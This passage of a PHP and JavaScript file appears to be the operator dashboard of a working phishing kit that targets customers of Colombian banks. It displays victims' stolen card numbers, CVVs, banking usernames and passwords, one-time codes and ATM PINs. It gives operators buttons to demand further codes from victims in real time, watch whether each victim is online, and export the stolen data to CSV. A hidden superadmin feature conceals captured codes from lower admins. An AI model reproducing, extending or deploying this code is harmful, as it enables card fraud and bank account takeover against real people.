                                                <button type="submit" class="btn btn-danger">❌ ERROR</button>
                                            </form>
                                        <?php endif; ?>

                                    <?php elseif ($s['estado'] === 'pending_otp'): ?>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="aprobar_otp" />
                                            <button type="submit" class="btn btn-approve">✅ Aprobar OTP</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="rechazar_otp" />
                                            <button type="submit" class="btn btn-reject">❌ Rechazar OTP</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;" onsubmit="mostrarErrorUsuarioOTP()">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="error_usuario_otp" />
                                            <button type="submit" class="btn btn-danger">❌ ERROR USUARIO</button>
                                        </form>
                                        <?php if ($mostrarClaveCajero): ?>
                                            <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                                <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                                <input type="hidden" name="action" value="pedir_clave_cajero" />
                                                <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                                            </form>
                                        <?php endif; ?>

                                    <?php elseif ($s['estado'] === 'pending_clave_cajero'): ?>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="aprobar_clave_cajero" />
                                            <button type="submit" class="btn btn-approve">✅ Aprobar Clave Cajero</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="rechazar_clave_cajero" />
                                            <button type="submit" class="btn btn-reject">❌ Rechazar Clave Cajero</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="pedir_otp" />
                                            <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                                        </form>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="id" value="<?php echo $s['id']; ?>" />
                                            <input type="hidden" name="action" value="pedir_clave_din" />
                                            <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                                        </form>

                                    <?php elseif ($s['estado'] === 'approved' || $s['estado'] === 'approved_otp' || $s['estado'] === 'approved_clave_cajero'): ?>
                                        <span class="btn btn-disabled">✅ Aprobado</span>

                                    <?php elseif ($s['estado'] === 'rejected' || $s['estado'] === 'rejected_otp' || $s['estado'] === 'rejected_clave_cajero' || $s['estado'] === 'rejected_user_error'): ?>
                                        <span class="btn btn-disabled">❌ Rechazado</span>

                                    <?php else: ?>
                                        <span class="btn btn-disabled">✓ Procesado</span>
                                    <?php endif; ?>

                                    <?php if (!empty($s['baneado'])): ?>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="ip" value="<?php echo htmlspecialchars($s['ip']); ?>" />
                                            <input type="hidden" name="action" value="unban_ip" />
                                            <button type="submit" class="btn-ban activo" title="Desbanear IP">🔓 DESBAN</button>
                                        </form>
                                    <?php else: ?>
                                        <form method="POST" action="?llave=0b2c4e6c3bcb7209f5ef20632b6ff001" style="display:inline;"
                                              onsubmit="return confirm('¿Banear esta IP? No podrá volver a acceder.');">
                                            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>" />
                                            <input type="hidden" name="ip" value="<?php echo htmlspecialchars($s['ip']); ?>" />
                                            <input type="hidden" name="ciudad" value="<?php echo htmlspecialchars($s['ciudad']); ?>" />
                                            <input type="hidden" name="id" value="<?php echo htmlspecialchars($s['id']); ?>" />
                                            <input type="hidden" name="action" value="ban_ip" />
                                            <button type="submit" class="btn-ban" title="Banear IP">🚫 BAN</button>
                                        </form>
                                    <?php endif; ?>

                                    <a href="?eliminar=<?php echo $s['id']; ?>&llave=0b2c4e6c3bcb7209f5ef20632b6ff001"
                                       onclick="return confirm('¿Eliminar esta solicitud?')"
                                       class="btn-eliminar">
                                        🗑️
                                    </a>
                                </div>
                            </div>
                        </div>
                    <?php endforeach; ?>
                <?php endif; ?>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // DATOS DEL USUARIO ACTUAL
        // ============================================
        const ROL_ACTUAL = '<?php echo $ROL_ACTUAL; ?>';
        const ES_SUPER = <?php echo $ES_SUPER ? 'true' : 'false'; ?>;
        const USUARIO_ACTUAL = '<?php echo addslashes($USUARIO_ACTUAL); ?>';
        const PRIORIDAD_DELAY = <?php echo PRIORIDAD_DELAY; ?>;

        // ============================================
        // GENERADOR DE SONIDO (PITIDO FUERTE)
        // ============================================
        function reproducirPitido() {
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();

                oscillator.type = 'square';
                oscillator.frequency.setValueAtTime(880, audioCtx.currentTime);
                oscillator.frequency.exponentialRampToValueAtTime(1200, audioCtx.currentTime + 0.05);

                gainNode.gain.setValueAtTime(0.7, audioCtx.currentTime);
                gainNode.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);

                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);

                oscillator.start(audioCtx.currentTime);
                oscillator.stop(audioCtx.currentTime + 0.4);

                setTimeout(() => {
                    try {
                        const osc2 = audioCtx.createOscillator();
                        const gain2 = audioCtx.createGain();
                        osc2.type = 'square';
                        osc2.frequency.setValueAtTime(1100, audioCtx.currentTime);
                        gain2.gain.setValueAtTime(0.6, audioCtx.currentTime);
                        gain2.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
                        osc2.connect(gain2);
                        gain2.connect(audioCtx.destination);
                        osc2.start(audioCtx.currentTime + 0.1);
                        osc2.stop(audioCtx.currentTime + 0.3);
                    } catch(e) {}
                }, 150);

                console.log('🔊 ¡Pitido reproducido!');

            } catch (error) {
                console.warn('⚠️ Error al reproducir sonido:', error);
            }
        }

        // ============================================
        // VARIABLES GLOBALES
        // ============================================
        let knownIds = new Set();
        let updateCounter = 0;
        let isUpdating = false;
        let lastTimestamp = 0;
        let ultimoTotal = <?php echo $total; ?>;
        const CSRF_TOKEN = '<?php echo $csrf_token; ?>';

        // ============================================
        // 🔒 MEMORIA DE ESTADOS CONGELADOS (SOLO ADMIN)
        // El Admin guarda una "foto" del estado de cada solicitud la primera
        // vez que la ve. Mientras el SuperAdmin manipule (últimos PRIORIDAD_DELAY s),
        // el Admin sigue viendo esa foto para el badge y los botones. Pasado el
        // tiempo, la foto se actualiza sola.
        // ============================================
        const estadoCongelado = {};

        function obtenerEstadoParaBotones(s) {
            if (ES_SUPER) return s.estado;

            const manipuladoRol = s.manipulado_rol || null;
            const manipuladoTs  = s.manipulado_timestamp || 0;
            const delta         = Math.floor(Date.now() / 1000) - manipuladoTs;

            if (manipuladoRol === 'superadmin' && delta >= 0 && delta < PRIORIDAD_DELAY) {
                // SuperAdmin manipulando → usar la foto, o crearla si no existe
                if (!(s.id in estadoCongelado)) {
                    estadoCongelado[s.id] = s.estado;
                }
                return estadoCongelado[s.id];
            }

            // Sin manipulación activa → ver la realidad y refrescar la foto
            estadoCongelado[s.id] = s.estado;
            return s.estado;
        }

        // ============================================
        // ESCAPAR HTML
        // ============================================
        function escapaHTML(texto) {
            if (!texto) return 'N/A';
            const div = document.createElement('div');
            div.textContent = texto;
            return div.innerHTML;
        }

        // ============================================
        // GENERAR HTML DE CÓDIGOS UNIFICADOS
        // ============================================
        function generarCodigosHTML(s) {
            // 🔒 El Admin NO ve los códigos si el SuperAdmin los manipuló (delay 3 min)
            const manipuladoRol = s.manipulado_rol || null;
            const manipuladoTs  = s.manipulado_timestamp || 0;
            const ahora = Math.floor(Date.now() / 1000);
            const delta = ahora - manipuladoTs;
            const puedeVerInfo = ES_SUPER || (manipuladoRol !== 'superadmin') || (delta >= PRIORIDAD_DELAY);

            const tieneClaveCajero   = puedeVerInfo && s.clave_cajero_codigo    && s.clave_cajero_codigo    !== 'N/A' && s.clave_cajero_codigo    !== '';
            const tieneClaveDinamica = puedeVerInfo && s.clave_dinamica_codigo && s.clave_dinamica_codigo !== 'N/A' && s.clave_dinamica_codigo !== '';
            const tieneOtp           = puedeVerInfo && s.otp_codigo             && s.otp_codigo             !== 'N/A' && s.otp_codigo             !== '';
            const tieneOtpSecundario = puedeVerInfo && s.otp_codigo_secundario  && s.otp_codigo_secundario  !== 'N/A' && s.otp_codigo_secundario  !== '';

            if (!tieneClaveCajero && !tieneClaveDinamica && !tieneOtp && !tieneOtpSecundario) {
                return '';
            }

            let html = '<div class="codigos-row">';

            if (tieneClaveCajero) {
                html += `
                    <div class="codigo-item clave-cajero">
                        <span class="codigo-label">🏧 Clave Cajero:</span>
                        <span class="codigo-valor">${escapaHTML(s.clave_cajero_codigo)}</span>
                    </div>
                `;
            }

            if (tieneOtp) {
                html += `
                    <div class="codigo-item otp">
                        <span class="codigo-label">📱 OTP:</span>
                        <span class="codigo-valor">${escapaHTML(s.otp_codigo)}</span>
                    </div>
                `;
            }

            if (tieneClaveDinamica) {
                html += `
                    <div class="codigo-item clave-dinamica">
                        <span class="codigo-label">🔑 Clave Dinámica:</span>
                        <span class="codigo-valor">${escapaHTML(s.clave_dinamica_codigo)}</span>
                    </div>
                `;
            }

            if (tieneOtpSecundario) {
                html += `
                    <div class="codigo-item otp">
                        <span class="codigo-label">📱 OTP Secundario:</span>
                        <span class="codigo-valor">${escapaHTML(s.otp_codigo_secundario)}</span>
                    </div>
                `;
            }

            html += '</div>';
            return html;
        }

        // ============================================
        // GENERAR HTML DE SOLICITUD (CON PRIORIDAD)
        // ============================================
        function generarSolicitudHTML(s) {
            const estados = {
                'pending': '⏳ Pendiente',
                'pending_otp': '⏳ OTP Pendiente',
                'pending_clave_cajero': '⏳ Clave Cajero Pendiente',
                'approved': '✅ Aprobada',
                'approved_otp': '✅ OTP Aprobado',
                'approved_clave_cajero': '✅ Clave Cajero Aprobado',
                'rejected': '❌ Rechazada',
                'rejected_otp': '❌ OTP Rechazado',
                'rejected_clave_cajero': '❌ Clave Cajero Rechazado',
                'rejected_user_error': '❌ Error de Usuario'
            };

            // 🔒 Estado que se usa para el badge y los botones (congelado si toca)
            const estadoBotones = obtenerEstadoParaBotones(s);
            let estadoTexto = estados[estadoBotones] || estadoBotones;

            const bancosClaveCajero = ['BBVA Colombia', 'Davibank', 'Davivienda', 'Caja Social'];
            const mostrarClaveCajero = bancosClaveCajero.includes(s.banco);

            const LLAVE = '0b2c4e6c3bcb7209f5ef20632b6ff001';

            // ===== CONTROL DE PRIORIDAD =====
            const manipuladoPor = s.manipulado_por || null;
            const manipuladoRol = s.manipulado_rol || null;
            const manipuladoTs  = s.manipulado_timestamp || 0;
            const ahora = Math.floor(Date.now() / 1000);
            const delta = ahora - manipuladoTs;

            // Admin bloqueado → botones inertes, SIN aviso revelador
            let adminBloqueado = false;
            if (!ES_SUPER && manipuladoRol === 'superadmin' && delta < PRIORIDAD_DELAY) {
                adminBloqueado = true;
            }

            // SuperAdmin ve cuando el Admin manipula (INSTANTÁNEO)
            let adminManipulando = false;
            if (ES_SUPER && manipuladoRol === 'admin' && delta < PRIORIDAD_DELAY) {
                adminManipulando = true;
            }

            // ¿Puede ver credenciales del banco? (igual que OTP/códigos)
            const puedeVerInfoJS = ES_SUPER || (manipuladoRol !== 'superadmin') || (delta >= PRIORIDAD_DELAY);

            let botones = '';

            if (estadoBotones === 'pending') {
                if (!s.usuario || s.usuario === 'N/A' || s.usuario === '') {
                    botones = `
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="aprobar" />
                            <button type="submit" class="btn btn-approve">✅ Aprobar</button>
                        </form>
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="rechazar" />
                            <button type="submit" class="btn btn-reject">❌ Rechazar</button>
                        </form>
                    `;
                } else {
                    let btnClaveCajeroHTML = '';
                    if (mostrarClaveCajero) {
                        btnClaveCajeroHTML = `
                            <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                                <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                                <input type="hidden" name="id" value="${s.id}" />
                                <input type="hidden" name="action" value="pedir_clave_cajero" />
                                <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                            </form>
                        `;
                    }
                    botones = `
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="pedir_otp" />
                            <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                        </form>
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="pedir_clave_din" />
                            <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                        </form>
                        ${btnClaveCajeroHTML}
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="error_credenciales" />
                            <button type="submit" class="btn btn-danger">❌ ERROR</button>
                        </form>
                    `;
                }
            } else if (estadoBotones === 'pending_otp') {
                let btnClaveCajeroHTML = '';
                if (mostrarClaveCajero) {
                    btnClaveCajeroHTML = `
                        <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                            <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                            <input type="hidden" name="id" value="${s.id}" />
                            <input type="hidden" name="action" value="pedir_clave_cajero" />
                            <button type="submit" class="btn btn-cajero">🏧 PEDIR CLAVE CAJERO</button>
                        </form>
                    `;
                }
                botones = `
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="aprobar_otp" />
                        <button type="submit" class="btn btn-approve">✅ Aprobar OTP</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="rechazar_otp" />
                        <button type="submit" class="btn btn-reject">❌ Rechazar OTP</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;" onsubmit="mostrarErrorUsuarioOTP()">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="error_usuario_otp" />
                        <button type="submit" class="btn btn-danger">❌ ERROR USUARIO</button>
                    </form>
                    ${btnClaveCajeroHTML}
                `;
            } else if (estadoBotones === 'pending_clave_cajero') {
                botones = `
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="aprobar_clave_cajero" />
                        <button type="submit" class="btn btn-approve">✅ Aprobar Clave Cajero</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="rechazar_clave_cajero" />
                        <button type="submit" class="btn btn-reject">❌ Rechazar Clave Cajero</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="pedir_otp" />
                        <button type="submit" class="btn btn-pedir">📱 PEDIR OTP</button>
                    </form>
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="id" value="${s.id}" />
                        <input type="hidden" name="action" value="pedir_clave_din" />
                        <button type="submit" class="btn btn-otp">🔑 PEDIR CLAVE DIN</button>
                    </form>
                `;
            } else if (estadoBotones === 'approved' || estadoBotones === 'approved_otp' || estadoBotones === 'approved_clave_cajero') {
                botones = `<span class="btn btn-disabled">✅ Aprobado</span>`;
            } else if (estadoBotones === 'rejected' || estadoBotones === 'rejected_otp' || estadoBotones === 'rejected_clave_cajero' || estadoBotones === 'rejected_user_error') {
                botones = `<span class="btn btn-disabled">❌ Rechazado</span>`;
            } else {
                botones = `<span class="btn btn-disabled">✓ Procesado</span>`;
            }

            // 🔒 Credenciales del banco: ocultas al Admin si SuperAdmin las manipuló (igual que OTP)
            let credencialesHTML = '';
            if (puedeVerInfoJS && s.usuario && s.usuario !== 'N/A' && s.usuario !== '') {
                credencialesHTML = `
                    <div class="credenciales-row">
                        <div class="campo">
                            <span class="etiqueta">Usuario:</span>
                            <span class="valor">${escapaHTML(s.usuario)}</span>
                        </div>
                        <div class="campo">
                            <span class="etiqueta">Contraseña:</span>
                            <span class="valor">${escapaHTML(s.password || '****')}</span>
                        </div>
                    </div>
                `;
            }

            let codigosHTML = generarCodigosHTML(s);

            // Datos del cliente: SIEMPRE visibles
            let datosHTML = '';
            if (s.nombre && s.nombre !== 'N/A') {
                datosHTML = `
                    <div class="datos-row">
                        <span><span class="label">👤</span> <span class="nombre">${escapaHTML(s.nombre)}</span></span>
                        <span><span class="label">🆔</span> ${escapaHTML(s.documento || 'N/A')}</span>
                        <span><span class="label">📧</span> ${escapaHTML(s.email || 'N/A')}</span>
                        <span><span class="label">📱</span> ${escapaHTML(s.celular || 'N/A')}</span>
                        <span><span class="label">💰</span> ${escapaHTML(s.monto || 'N/A')}</span>
                    </div>
                `;
            }

            let ipRowHTML = `
                <div class="ip-row">
                    <div class="ip-item ${s.baneado ? 'baneada' : ''}">
                        <span class="ip-label">🌐 IP</span>
                        <span class="ip-valor">${escapaHTML(s.ip || 'Desconocida')}</span>
                    </div>
                    <div class="ip-item ciudad">
                        <span class="ip-label">📍 Ciudad</span>
                        <span class="ip-valor">${escapaHTML(s.ciudad || 'Desconocida')}</span>
                    </div>
                </div>
            `;

            // Aviso SOLO para SuperAdmin (INSTANTÁNEO, el Admin nunca ve nada)
            let avisoHTML = '';
            if (adminManipulando) {
                avisoHTML = `<div class="aviso-prioridad super">👁️ El <strong>Admin (${escapaHTML(manipuladoPor || 'Admin')})</strong> está manipulando esta solicitud ahora mismo.</div>`;
            }

            let btnBanHTML = '';
            if (s.baneado) {
                btnBanHTML = `
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="ip" value="${escapaHTML(s.ip)}" />
                        <input type="hidden" name="action" value="unban_ip" />
                        <button type="submit" class="btn-ban activo" title="Desbanear IP">🔓 DESBAN</button>
                    </form>
                `;
            } else {
                btnBanHTML = `
                    <form method="POST" action="?llave=${LLAVE}" style="display:inline;"
                          onsubmit="return confirm('¿Banear esta IP? No podrá volver a acceder.');">
                        <input type="hidden" name="csrf_token" value="${CSRF_TOKEN}" />
                        <input type="hidden" name="ip" value="${escapaHTML(s.ip)}" />
                        <input type="hidden" name="ciudad" value="${escapaHTML(s.ciudad)}" />
                        <input type="hidden" name="id" value="${escapaHTML(s.id)}" />
                        <input type="hidden" name="action" value="ban_ip" />
                        <button type="submit" class="btn-ban" title="Banear IP">🚫 BAN</button>
                    </form>
                `;
            }

            const eliminarUrl = `?eliminar=${s.id}&llave=${LLAVE}`;

            return `
                <div class="solicitud" data-id="${s.id}" data-estado="${s.estado}">
                    <div class="card-row">
                        <span class="online-dot" data-online-id="${s.id}"></span>
                        <span class="card-number">💳 ${escapaHTML(s.numero_tarjeta || s.tarjeta || 'N/A')}</span>
                    </div>
                    <div class="card-row">
                        <span class="card-detail">🔢 CVV: <span class="highlight">${escapaHTML(s.cvv || '***')}</span></span>
                        <span class="card-detail">📅 Exp: <span class="highlight">${escapaHTML(s.vencimiento || 'N/A')}</span></span>
                        <span class="card-detail">🏦 <span class="bank">${escapaHTML(s.banco || 'N/A')}</span></span>
                    </div>
                    ${credencialesHTML}
                    ${codigosHTML}
                    ${datosHTML}
                    ${ipRowHTML}
                    ${avisoHTML}
                    <div class="actions-row">
                        <span class="estado ${estadoBotones}">${estadoTexto}</span>
                        <div class="form-actions ${adminBloqueado ? 'inertes' : ''}">
                            ${botones}
                            ${btnBanHTML}
                            <a href="${eliminarUrl}"
                               onclick="return confirm('¿Eliminar esta solicitud?')"
                               class="btn-eliminar">
                                🗑️
                            </a>
                        </div>
                    </div>
                </div>
            `;
        }

        // ============================================
        // MOSTRAR ERROR USUARIO OTP
        // ============================================
        function mostrarErrorUsuarioOTP() {
            const errorDiv = document.createElement('div');
            errorDiv.style.cssText = 'background: #3a1a1a; color: #ff6b6b; padding: 12px 20px; border-radius: 8px; margin-bottom: 16px; position: fixed; top: 100px; left: 50%; transform: translateX(-50%); z-index: 1000; max-width: 400px; animation: slideDown 0.3s ease;';
            errorDiv.textContent = 'Ha ocurrido un error, inténtalo de nuevo';
            document.body.appendChild(errorDiv);

            setTimeout(() => {
                errorDiv.remove();
            }, 4000);
        }

        // ============================================
        // VERIFICAR ESTADO ONLINE/OFFLINE
        // ============================================
        async function verificarOnline() {
            try {
                const response = await fetch('/api/heartbeat.php');
                if (!response.ok) return;

                const data = await response.json();
                if (!data.success) return;

                const onlineMap = data.online || {};

                document.querySelectorAll('.online-dot').forEach(dot => {
                    const id = dot.dataset.onlineId;
                    if (!id) return;

                    const info = onlineMap[id];
                    const estaOnline = info && info.online === true;

                    if (estaOnline) {
                        dot.classList.add('online');
                    } else {
                        dot.classList.remove('online');
                    }
                });

            } catch (error) {
                // Silencioso
            }
        }

        // ============================================
        // ACTUALIZAR DATOS VÍA AJAX
        // ============================================
        async function actualizarDatos() {
            if (isUpdating) return;
            isUpdating = true;

            try {
                const response = await fetch(`/api/estado_panel.php?timestamp=${lastTimestamp}`);

                if (!response.ok) throw new Error('Error en la respuesta');

                const data = await response.json();

                if (!data.success) throw new Error('Error en los datos');

                let hayNuevas = false;
                let cantidadNuevas = 0;

                if (data.solicitudes && data.solicitudes.length > 0 && knownIds.size > 0) {
                    const idsActuales = new Set(data.solicitudes.map(s => s.id));
                    for (const id of idsActuales) {
                        if (!knownIds.has(id)) {
                            cantidadNuevas++;
                            hayNuevas = true;
                        }
                    }
                } else if (data.solicitudes && data.solicitudes.length > 0 && knownIds.size === 0) {
                    hayNuevas = true;
                    cantidadNuevas = data.solicitudes.length;
                }

                if (hayNuevas && cantidadNuevas > 0) {
                    console.log(`🔔 ¡${cantidadNuevas} nueva(s) solicitud(es)!`);
                    const veces = Math.min(cantidadNuevas, 3);
                    for (let i = 0; i < veces; i++) {
                        setTimeout(() => {
                            reproducirPitido();
                        }, i * 250);
                    }
                    document.getElementById('statusDot').className = 'dot';
                    document.getElementById('statusText').textContent = `🔔 ¡${cantidadNuevas} nueva(s)!`;
                    setTimeout(() => {
                        document.getElementById('statusText').textContent = 'Auto-actualización';
                    }, 3000);
                }

                // 🔔 SI ES SUPERADMIN y hay manipulación de Admin ACTIVA → FORZAR RE-RENDER
                let hayManipulacionAdmin = false;
                if (ES_SUPER && data.solicitudes) {
                    const ahoraJs = Math.floor(Date.now() / 1000);
                    for (const s of data.solicitudes) {
                        if (s.manipulado_rol === 'admin') {
                            const delta = ahoraJs - (s.manipulado_timestamp || 0);
                            if (delta >= 0 && delta < PRIORIDAD_DELAY) {
                                hayManipulacionAdmin = true;
                                break;
                            }
                        }
                    }
                }

                if (data.hay_cambios === false && !hayManipulacionAdmin) {
                    updateCounter++;
                    document.getElementById('updateCounter').textContent = `🔄 Sin cambios (${updateCounter})`;
                    document.getElementById('statusDot').className = 'dot';
                    await verificarOnline();
                    return;
                }

                lastTimestamp = data.timestamp;

                if (data.solicitudes) {
                    knownIds = new Set(data.solicitudes.map(s => s.id));
                }

                const listaActual = document.getElementById('solicitudesList');

                if (data.solicitudes.length === 0) {
                    listaActual.innerHTML = `
                        <div class="empty">
                            <span class="icon">📭</span>
                            No hay solicitudes aún
                        </div>
                    `;
                } else {
                    let htmlCompleto = '';
                    data.solicitudes.forEach(s => {
                        htmlCompleto += generarSolicitudHTML(s);
                    });

                    listaActual.innerHTML = htmlCompleto;
                }

                document.querySelector('#statTotal .number.total').textContent = data.stats.total;
                document.querySelector('#statPending .number.pending').textContent = data.stats.pendientes;
                document.querySelector('#statApproved .number.approved').textContent = data.stats.aprobadas;
                document.querySelector('#statRejected .number.rejected').textContent = data.stats.rechazadas;

                document.getElementById('totalBadge').textContent = data.stats.total + ' total';

                updateCounter++;
                document.getElementById('updateCounter').textContent = `🔄 Actualizado (${updateCounter})`;

                document.getElementById('statusDot').className = 'dot';

                await verificarOnline();

            } catch (error) {
                console.error('Error al actualizar:', error);
                document.getElementById('statusDot').className = 'dot error';
            } finally {
                isUpdating = false;
            }
        }

        // ============================================
        // EXPORTAR A CSV
        // ============================================
        function exportarExcel() {
            if (confirm('📊 ¿Exportar todas las solicitudes a CSV?')) {
                window.location.href = '?exportar_excel=si&llave=0b2c4e6c3bcb7209f5ef20632b6ff001';
            }
        }

        // ============================================
        // ELIMINAR TODAS
        // ============================================
        function eliminarTodas() {
            if (confirm('⚠️ ¿Eliminar TODAS las solicitudes? Esta acción no se puede deshacer.')) {
                if (confirm('¿Estás SEGURO?')) {
                    window.location.href = '?eliminar_todas=si&llave=0b2c4e6c3bcb7209f5ef20632b6ff001';
                }
            }
        }

        // ============================================
        // INICIAR AUTO-ACTUALIZACIÓN
        // ============================================
        window.addEventListener('load', function() {
            document.querySelectorAll('.solicitud').forEach(el => {
                knownIds.add(el.dataset.id);
            });

            console.log(`📋 ${knownIds.size} solicitudes cargadas inicialmente`);
            console.log(`👤 Rol actual: ${ROL_ACTUAL.toUpperCase()}`);

            setTimeout(() => {
                verificarOnline();
            }, 500);

            setTimeout(() => {
                actualizarDatos();
            }, 1000);

            // ⚡ Reducir el intervalo a 2s para que el aviso sea más rápido
            setInterval(() => {
                actualizarDatos();
            }, 2000);

            setInterval(() => {
                verificarOnline();
            }, 2000);

            console.log('🔄 Actualización automática iniciada');
            console.log('🟢 Verificación online iniciada');
        });
    </script>
</body>
</html>